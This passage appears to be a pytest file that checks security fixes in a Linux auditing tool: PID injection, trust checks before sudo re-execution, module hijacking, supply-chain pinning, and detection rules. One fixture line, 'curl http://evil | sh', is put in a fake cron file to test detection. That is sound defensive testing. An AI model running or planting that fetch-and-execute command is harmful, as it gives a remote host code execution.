    assert conns[0]["pid"] == ""
    assert any("4242" in reason for reason in collector.degraded)


def test_F06_matching_comm_keeps_the_pid(tmp_path):
    conns, _ = _connections(tmp_path, _ss_line('"sshd",pid=4242,fd=3)'),
                            comm={"4242": "sshd"})
    assert conns[0]["pid"] == "4242"


def test_F06_netstat_program_name_cannot_inject_a_pid():
    from ubuntils.collectors.network import NetworkCollector
    assert NetworkCollector._netstat_pid(["tcp", "0", "0", "a:1", "b:2", "ESTABLISHED",
                                          "4242/pid=1,fd=3)"]) == "4242"


# ─── F-07: re-exec trust check ──────────────────────────────────────────────

def test_F07_user_owned_install_dir_is_reported(tmp_path):
    import pytest
    from ubuntils.cli import install_trust_problems
    if os.geteuid() == 0:
        pytest.skip("needs a directory not owned by root")
    install = tmp_path / "venv" / "lib" / "ubuntils"
    install.mkdir(parents=True)
    problems = install_trust_problems([str(install)])
    assert any(f"{os.path.realpath(install)} is owned by uid {os.geteuid()}" in p
               for p in problems)


def test_F07_root_owned_system_dirs_pass():
    from ubuntils.cli import install_trust_problems
    if os.stat("/usr").st_uid != 0:  # pragma: no cover - odd test host
        return
    assert install_trust_problems(["/usr"]) == []


def _reexec_attempt(monkeypatch, argv):
    from click.testing import CliRunner
    from ubuntils import cli
    calls = []
    monkeypatch.setattr(cli.os, "geteuid", lambda: 1000)
    monkeypatch.setattr(cli.os, "execv", lambda path, args: calls.append(args))
    monkeypatch.setattr(cli, "resolve_command", lambda name: "/usr/bin/sudo")
    monkeypatch.setattr(cli, "install_trust_problems",
                        lambda: ["/home/eve/.local/pipx/venvs/ubuntils is owned by uid 1000"])
    monkeypatch.setattr(cli.sys, "argv", ["ubuntils", *argv])
    result = CliRunner().invoke(cli.main, argv)
    return result, calls


def test_F07_untrusted_install_refuses_to_escalate_without_the_flag(monkeypatch):
    result, calls = _reexec_attempt(monkeypatch, ["rollback", "/nonexistent"])
    assert result.exit_code == 1
    assert calls == []
    assert "--allow-user-install" in result.output
    assert "owned by uid 1000" in result.output


def test_F07_allow_user_install_escalates_in_isolated_mode(monkeypatch):
    from ubuntils.cli import REEXEC_BOOTSTRAP
    _result, calls = _reexec_attempt(
        monkeypatch, ["--allow-user-install", "rollback", "/nonexistent"])
    assert calls and calls[0][2:5] == ["-I", "-c", REEXEC_BOOTSTRAP]
    assert calls[0][5:] == ["--allow-user-install", "rollback", "/nonexistent"]


def test_F07_isolated_bootstrap_still_imports_ubuntils_and_ignores_cwd(tmp_path):
    import subprocess
    import sys
    from ubuntils import __version__
    from ubuntils.cli import REEXEC_BOOTSTRAP
    planted = tmp_path / "click"
    planted.mkdir()
    (planted / "__init__.py").write_text("print('HIJACKED')\n")
    out = subprocess.run([sys.executable, "-I", "-c", REEXEC_BOOTSTRAP, "version"],
                         cwd=tmp_path, capture_output=True, text=True, timeout=60)
    assert "HIJACKED" not in out.stdout + out.stderr
    assert out.stdout.strip() == __version__


# ─── F-11: supply chain ─────────────────────────────────────────────────────

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def test_F11_every_action_is_pinned_to_a_commit_sha():
    import glob
    import re
    uses = []
    for wf in glob.glob(os.path.join(_REPO, ".github", "workflows", "*.yml")):
        uses += re.findall(r"uses:\s*(\S+)(.*)", open(wf).read())
    assert uses
    for ref, comment in uses:
        assert re.fullmatch(r"[\w.-]+/[\w.-]+@[0-9a-f]{40}", ref), ref
        assert re.search(r"#\s*v\d", comment), f"{ref}: no tag comment"


def test_F11_lock_pins_every_package_by_hash():
    import re
    text = open(os.path.join(_REPO, "requirements.lock")).read()
    blocks = re.split(r"\n(?=[A-Za-z])", text.split("\n", 1)[1])
    pins = [b for b in blocks if not b.startswith("#") and b.strip()]
    assert len(pins) > 5
    for block in pins:
        assert re.match(r"[\w.-]+(\[[\w,-]+\])?==\S+", block), block.splitlines()[0]
        assert "--hash=sha256:" in block, block.splitlines()[0]
    assert re.search(r"^setuptools==", text, re.MULTILINE)  # the build backend too


def test_F11_ci_audits_the_lock_and_dependabot_watches_both_ecosystems():
    import yaml
    ci = open(os.path.join(_REPO, ".github", "workflows", "ci.yml")).read()
    assert "pip-audit --require-hashes --disable-pip -r requirements.lock" in ci
    bot = yaml.safe_load(open(os.path.join(_REPO, ".github", "dependabot.yml")))
    assert {u["package-ecosystem"] for u in bot["updates"]} == {"pip", "github-actions"}


# ─── F-12: substring rules see the whole text ───────────────────────────────

def _custom_rule(match, pattern):
    from ubuntils.detectors.custom_rules import CustomRule
    from ubuntils.detectors.finding import Severity
    return CustomRule(id="X", severity=Severity.HIGH, title="t", description="d",
                      source="cron", match=match, pattern=pattern)


def test_F12_padding_cannot_push_a_substring_match_out_of_view():
    padded = "A" * 10_000 + " curl http://evil | sh"
    assert _custom_rule("substring", "curl http://evil").matches("/etc/cron.d/x", padded)


def test_F12_regex_rules_keep_the_scan_cap():
    padded = "A" * 10_000 + " curl http://evil | sh"
    assert not _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded)
    assert _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded[-30:])


# ─── F-13: the confirm modal renders attacker text literally ────────────────

async def test_F13_markup_in_remediation_description_is_shown_literally():
    from textual.app import App
    from textual.widgets import Static
    from ubuntils.detectors.finding import Finding, Severity
    from ubuntils.tui.confirm_modal import ConfirmModal
    finding = Finding(rule_id="CRON_TMP_PATH", severity=Severity.HIGH, title="t",
                      description="d", artifact_path="/etc/cron.d/x", raw_value="r",
                      remediation_available=True,
                      remediation_description="Remove [/bold] and [red]this[/red] line")

    class _App(App):
        def on_mount(self):
            self.push_screen(ConfirmModal(finding))

    async with _App().run_test() as pilot:
        await pilot.pause()
        desc = pilot.app.screen.query_one("#fix-desc", Static)
        assert str(desc.render()) == "Remove [/bold] and [red]this[/red] line"
